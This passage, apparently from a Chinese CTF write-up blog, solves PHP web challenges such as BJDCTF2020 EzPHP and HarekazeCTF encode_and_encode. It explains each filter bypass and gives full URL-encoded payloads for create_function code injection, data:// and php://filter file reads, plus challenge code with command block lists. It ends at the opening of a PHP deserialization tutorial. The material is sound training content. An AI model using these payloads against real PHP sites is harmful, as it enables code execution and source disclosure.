<p>其中<code>$_SERVER['PHP_SELF']</code>我们知道它的值是url相对路径。也就是说我们输入<code>/index.php/config.php?source</code> 会返回<code>/index.php/config.php</code></p>
<p>我们知道<code>preg_match</code> 是需要完全匹配才会返回true的，也就是说我们输入<code>/index.php/config.php/a</code>就可以绕过，但是basename的结果会是<code>a</code>显然会报错，因为没这个文件。此时我们想到了basename会忽略一些奇怪的字符<code>%80 ~ %ff</code>。</p>
<p>所以我们输入<code>/index.php/comfig.php/%ff</code> 就可以进行显示comfig.php文件，这里所有的操作都是在index.php下进行的（我们看到的代码都是index.php的代码）。当然我们不要忘记传get的变量source。</p>
<p>payload：<code>/index.php/config.php/%81?source</code></p>
<h2 id="BJDCTF2020-EzPHP">[BJDCTF2020]EzPHP</h2>
<h3 id="考点-v10">考点</h3>
<ul>
<li>QUERY_STRING绕过</li>
<li>SHA1数组绕过</li>
<li>preg_match数组绕过</li>
<li>extract变量覆盖</li>
<li>create_function注入</li>
</ul>
<h3 id="解题-v10">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line">$shana = $_GET[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">$arg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$code = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="SERVER-‘QUERY-STRING’-绕过">$_SERVER[‘QUERY_STRING’]绕过</h4>
<p>需要明确一个知识点：</p>
<p><code>$_SERVER['QUERY_STRING']</code>返回url中查询的字符串，与此类似的还有：</p>
<ul>
<li><code>$_SERVER['REQUEST_URI']</code>返回访问此页面所需的URI</li>
<li><code>$_SERVER['SCRIPT_NAME']</code>返回包含当前脚本的路径</li>
<li><code>$_SERVER['PHP_SELF']</code>当前正在执行脚本的文件名</li>
</ul>
<p>举个例子：(浏览器自动将file的url编码解码了)</p>
<p><img src="https://www.moonback.xyz/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM%E6%88%AA%E5%9B%BE20200210162052.png" alt="img"></p>
<p>可以看到，<code>$_SERVER['QUERY_STRING']</code>和<code>$_SERVER['REQUEST_URI']</code>在传输时不会url解码，而<code>$_GET</code>,<code>$_POST</code>会url解码，因此我们可以url编码绕过下面代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="preg-match换行符绕过">preg_match换行符绕过</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>由于没有<code>/s</code>修饰符用来在匹配时匹配换行符，我们可以使用<code>%0a</code>换行污染绕过。</p>
<h4 id="REQUEST字母匹配绕过">$_REQUEST字母匹配绕过</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$_REQUEST</code>包含<code>_POST</code>、<code>_GET</code>和<code>COOKIE</code>三个全局变量，并且POST具有更高的优先值，也就是说我们可以POST同样名称满足条件的值，比如数字就可以绕过这个匹配。另外，数组类型的数据不需要POST，<code>preg_match()</code>只能匹配字符串，数组得以绕过。</p>
<blockquote>
<p>我在BUUOJ上面做这个题的时候，一直绕不过这个字母匹配，再仔细一看，发现是buu自带的cookie的原因，删掉即可。</p>
</blockquote>
<h4 id="file-get-contents比对绕过">file_get_contents比对绕过</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>刚开始想的是<code>php://input</code>，后来发现要POST数据，因此便不能用了，这里可以用<code>data://</code>，示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
<h4 id="sha1比较">sha1比较</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接数组绕过。</p>
<h4 id="extract变量覆盖">extract变量覆盖</h4>
<p>因为<code>extract()</code>函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量，所以这里我们可以传数组，即<code>flag[code]</code>和<code>flag[arg]</code>的形式。</p>
<h4 id="create-function代码注入">create_function代码注入</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基本的注入形式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return($a+$b);&#125;eval($_POST[1]);\\&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>执行时相当于：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
<p>那么这道题禁用了很多类似无参数RCE的函数关键字，也禁用了很多读文件的系统命令。</p>
<p>但是代码中已经包含了<code>flag.php</code>，那么就可以使用里面的变量。所以要想办法在不指定变量名称的情况下输出变量的值，可以想到：<strong>是否存在一个函数，能输出所有变量的值？</strong></p>
<p>答案是<code>get_defined_vars()</code>用来输出所有变量和值。</p>
<p>那么整体的payload就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure>
<p>解码后就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure>
<p>打印了所有变量</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200717100826.png" alt=""></p>
<p>提示我们真的flag在<code>realfl4g.php</code>里面，那么就去包含<code>realfl4g.php</code>文件。</p>
<p>这个地方过滤了<code>include</code>和单引号，可以用<code>require()</code>来代替，过滤<code>flag</code>关键字，就用base64编码绕过。那么payload就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1nD3x.php?</span><br><span class="line">file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;require(base64_%64%65%63%6f%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function</span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure>
<p>解码后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;require(base64_decode(cmVhbGZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200717102737.png" alt=""></p>
<h4 id="取反绕过-伪协议读取源码">取反绕过+伪协议读取源码</h4>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure>
<p>读到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！&quot;</span>;</span><br><span class="line">	$f4ke_flag = <span class="string">&quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;</span>;</span><br><span class="line">	$rea1_f1114g = <span class="string">&quot;flag&#123;b1fcb796-18ed-4790-96d4-42becc504efc&#125;&quot;</span>;</span><br><span class="line">	<span class="keyword">unset</span>($rea1_f1114g);</span><br></pre></td></tr></table></figure>
<p>原来是把变量给释放了。</p>
<h3 id="拓展-v3">拓展</h3>
<p>介绍一种非预期解：</p>
<h4 id="数组绕过">数组绕过</h4>
<p>加了个参数，传上去伪协议，然后<code>get_defined_vars()</code>数组获取到这个伪协议放到<code>require()</code>里包含，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?deb%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;%64%61%74%61%3a%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;rce&#x3D;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%72%65%61%31%66%6c%34%67%2e%70%68%70&amp;rce2&#x3D;r&amp;sha%6e%61[]&#x3D;a&amp;pa%73sw%64[]&#x3D;b&amp;fla%67[co%64e]&#x3D;create_function&amp;fla%67[ar%67]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);%0a&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>解码后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;file&#x3D;data:,debu_debu_aqua&amp;rce&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php&amp;rce2&#x3D;r&amp;shana[]&#x3D;a&amp;passwd[]&#x3D;b&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);</span><br><span class="line">&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="参考">参考</h3>
<p><a href="https://www.gem-love.com/ctf/770.html">https://www.gem-love.com/ctf/770.html</a></p>
<h2 id="HarekazeCTF2019-encode-and-encode">[HarekazeCTF2019]encode_and_encode</h2>
<h3 id="考点-v11">考点</h3>
<ul>
<li>json字符转义</li>
<li>伪协议绕过</li>
</ul>
<h3 id="解题-v11">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>
<p>大概就是传一个json编码的数据，然后json解码，进行is_valid黑名单过滤，然后file_get_contents，再一次进行黑名单过滤，也就是既对原始数据，又对文件内容进行了过滤，由于json使支持unicode编码的，所以可以用unicode代替关键字，并用伪协议base64编码，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="参考-v2">参考</h3>
<p><a href="https://p1htmlkernalweb.mybluemix.net/articles/%5BHarekazeCTF2019%5Dencode_and_encode_3837296_csdn.html">https://p1htmlkernalweb.mybluemix.net/articles/[HarekazeCTF2019]encode_and_encode_3837296_csdn.html</a></p>
<h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1">[CISCN2019 总决赛 Day1 Web4]Laravel1</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox">[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2>
<h3 id="TODO-v3">TODO</h3>
<h2 id="HarekazeCTF2019-Easy-Notes">[HarekazeCTF2019]Easy Notes</h2>
<h3 id="TODO-v4">TODO</h3>
<h2 id="RCTF-2019-Nextphp">[RCTF 2019]Nextphp</h2>
<h3 id="TODO-v5">TODO</h3>
<h2 id="De1CTF-2019-ShellShellShell">[De1CTF 2019]ShellShellShell</h2>
<h3 id="TODO-v6">TODO</h3>
]]></content>
      <categories>
        <category>CTF</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化漏洞学习-基础篇</title>
    <url>/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    <content><![CDATA[<h1 id="PHP反序列化漏洞学习——基础篇">PHP反序列化漏洞学习——基础篇</h1>
<h2 id="0x01-什么是序列化和反序列化">0x01 什么是序列化和反序列化</h2>
<h3 id="php的序列化">php的序列化</h3>
<p>PHP 的所谓的序列化也是一个将各种类型的数据，压缩并按照一定格式存储的过程，他所使用的函数是serialize() ，我们来看下面的实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $name = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">	<span class="keyword">protected</span> $gender = <span class="string">&#x27;male&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> $age = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_name</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> Person();</span><br><span class="line">$user-&gt;set_name(<span class="string">&#x27;ca01h&#x27;</span>);</span><br><span class="line">$data = serialize($user);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
<p>这是一个简单的 php 类，然后我们实例化以后对其属性进行了赋值，然后调用了 serialize() 并且输出，我们看一下输出的结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507151334.png" alt=""></p>
<p>依次解释如下：</p>
<p><code>O</code>代表Object对象；</p>
<p><code>6</code>代表类名长度是6；</p>
<p><code>Person</code>代表类名；</p>
<p><code>3</code>代表类中的属性有3个；</p>
<p><code>s:12:&quot;&lt;0x00&gt;Person&lt;0x00&gt;name&quot;;s:5:&quot;ca01h&quot;;</code>：其中<code>s</code>代表String类型，<code>12</code>代表属性名<code>&lt;0x00&gt;Person&lt;0x00&gt;name</code>的长度，<code>s</code>代表String类型，<code>5</code>代表属性值的长度，<code>&quot;ca01h&quot;</code>是属性值；</p>
<p><code>s:9:&quot;&lt;0x00&gt;*&lt;0x00&gt;gender&quot;;s:4:&quot;male&quot;;</code>：其中<code>s</code>代表String类型，<code>9</code>代表属性名<code>&lt;0x00&gt;*&lt;0x00&gt;gender</code>的长度，<code>s</code>代表String类型，<code>4</code>代表属性值的长度，<code>&quot;male&quot;</code>是属性值；</p>
<p><code>s:3:&quot;age&quot;;i:17;</code>：其中<code>s</code>代表String类型，<code>3</code>代表属性名<code>&quot;age&quot;</code>的长度，<code>i</code>代表Integer类型，<code>17</code>是属性值。</p>
